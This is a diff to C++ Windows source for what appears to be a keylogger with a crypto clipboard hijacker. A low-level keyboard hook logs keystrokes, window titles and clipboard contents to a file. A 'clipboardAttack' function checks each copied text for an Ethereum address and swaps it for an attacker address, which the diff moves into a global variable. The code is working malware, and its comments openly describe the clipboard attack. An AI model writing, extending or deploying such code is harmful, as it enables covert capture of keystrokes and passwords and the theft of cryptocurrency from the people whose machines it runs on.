@@ -19,10 +19,13 @@
 prevWindowTitle: stores the previous window title after logging.
 
 clipboardSequenceNumber: sequence number for the current clipboard, incremented each time the clipboard is changed, more: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardsequencenumber
+
+attackerAddress: Ethereum address to inject
 */
 
 std::wstring	g_prevWindowTitle;
 DWORD			g_prevClipboardSequenceNumber;
+LPWSTR			attackerAddress = L"0x000000000000000000000000000000000000dEaD";
 
 /* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS], returns a wide string to be written in wide ofstream */
 
@@ -47,26 +50,6 @@ std::wstring getWindowTitle(){
 	return (windowtitle);
 }
 
-/* getClipboardText is called in each clipboard change to log it, It is callig GetClipboardData with the unicode flag to return clipboard text written in any language */
-
-//FIX NON-TEXT errors
-
-std::wstring getClipboardText(){
-	if (OpenClipboard(NULL) == 0){
-		//std::cout << "Error in openclipboard" << std::endl;
-	}
-	HANDLE hdata = GetClipboardData(CF_UNICODETEXT);
-	wchar_t *pszText = static_cast<wchar_t *>( GlobalLock(hdata) );
-	if (pszText == NULL){
-		//std::cout << "w 3lach" << std::endl;
-		CloseClipboard();
-		return (L"[Non-Text Copy]");
-	}
-	std::wstring text(pszText);
-	CloseClipboard();
-	return (text);
-}
-
 /* writeLogs() Writes the date, window title and buffer content to the logfile.
 the local needs to be associated with imbue() to the wide file stream in order to write any unicode to the file */
 
@@ -84,17 +67,50 @@ void writeLogs(std::wstring buf, std::wstring windowTitle) {
 	logfile.close();
 }
 
-bool isEthAddress(std::wstring cbText, LPWSTR attackerAddress){
+/* WriteErrorLog is a called rarely when an error occurs in win32api functions for a debugging purposes */
+
+void writeErrorLog(std::wstring errorMessage){
+	const std::locale utf8_locale = std::locale("en_US.UTF-8");
+	std::wofstream logfile;
+
+	logfile.open("logs.txt", std::ios::app);
+	logfile.imbue(utf8_locale);
+	logfile << std::endl << L"!!! ERROR !!! : *";
+	logfile << errorMessage << "*" << std::endl << std::endl;
+}
+
+
+/* getClipboardText is called in each clipboard change to log it, It is callig GetClipboardData with the unicode flag to return clipboard text written in any language */
+
+//FIX NON-TEXT errors
+
+std::wstring getClipboardText(){
+	if (OpenClipboard(NULL) == 0){
+		writeErrorLog(L"Error in opening clipboard");
+		return (L"");
+	}
+	HANDLE hdata = GetClipboardData(CF_UNICODETEXT);
+	wchar_t *pszText = static_cast<wchar_t *>( GlobalLock(hdata) );
+	if (pszText == NULL){
+		CloseClipboard();
+		return (L"[Non-Text Copy]");
+	}
+	std::wstring text(pszText);
+	CloseClipboard();
+	return (text);
+}
+
+bool isEthAddress(std::wstring cbText){
 	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42 && wcscmp(cbText.c_str(), attackerAddress) != 0) {
 		return TRUE;
 	}
 	return FALSE;
 }
 
-/* clipboardAttack is a famous attack in the crypto space, it will scan your clipboard for amy cryptocurrency address, when copied it will be immediately replaced with the attacker's address.
+/* clipboardAttack is a famous attack in the crypto space, it will scan your clipboard for any cryptocurrency address, when copied it will be immediately replaced with the attacker's address.
 This function check if the new clipboard data is an ethereum address then allocates a global memory object for the attacker's address to be copied to clipboard instead */
 
-void clipboardAttack(LPWSTR attackerAddress){
+void clipboardAttack(){
 	std::wstring	cbText;
 	HGLOBAL 		dstHandle;
 	LPWSTR			dstEthAddress;
@@ -102,7 +118,7 @@ void clipboardAttack(LPWSTR attackerAddress){
 
 	len = wcslen(attackerAddress); // Should be 42
 	cbText = getClipboardText();
-	if (isEthAddress(cbText, attackerAddress)){
+	if (isEthAddress(cbText)){
 		//std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
 		dstHandle = GlobalAlloc(GMEM_MOVEABLE,  (len + 1) * sizeof(WCHAR));
 		dstEthAddress = (LPWSTR)GlobalLock(dstHandle);
@@ -111,7 +127,8 @@ void clipboardAttack(LPWSTR attackerAddress){
 		GlobalUnlock(dstHandle);
 
 		if (OpenClipboard(NULL) == 0){
-		//std::cout << "Error in openclipboard" << std::endl;
+		writeErrorLog(L"Error in opening clipboard");
+		return ;
 		}
 		EmptyClipboard();
 		SetClipboardData(CF_UNICODETEXT, dstHandle);
@@ -243,7 +260,8 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
         GetKeyState(VK_MENU);
 		//std::
 		if (GetKeyboardState(lpKeyState) == 0){
-			//std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling
+			writeErrorLog(L"Keyboard State return error.");
+			return (L"");
 		}
 		if (GetKeyState(VK_CONTROL) & 0x8000){
 			lpKeyState[VK_CONTROL] = 0;
@@ -259,7 +277,7 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
     KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
     std::wstring finalChar;
-	static std::wstring buf; // static to no reset after each keyboardHook call
+	static std::wstring buf; // static to not reset after each keyboardHook call
 	std::wstring currentWindowTitle;
 	DWORD currentClipboardSequenceNumber;
 
@@ -268,12 +286,9 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
 		currentWindowTitle = getWindowTitle();
 		currentClipboardSequenceNumber = GetClipboardSequenceNumber();
-		//std::cout << "clipboard sequence :" << GetClipboardSequenceNumber() << std::endl;
-		//std::cout << "vk code: " << s->vkCode << std::endl;
-		//std::cout << "scan code: " << s->scanCode << std::endl;
 		if (currentClipboardSequenceNumber != g_prevClipboardSequenceNumber){
 			writeClipboardChange();
-			clipboardAttack(L"0x000000000000000000000000000000000000dEaD");
+			clipboardAttack();
 			g_prevClipboardSequenceNumber = currentClipboardSequenceNumber;
 		}
 		// NEED TO FIX: first time program enters it prints 1 char
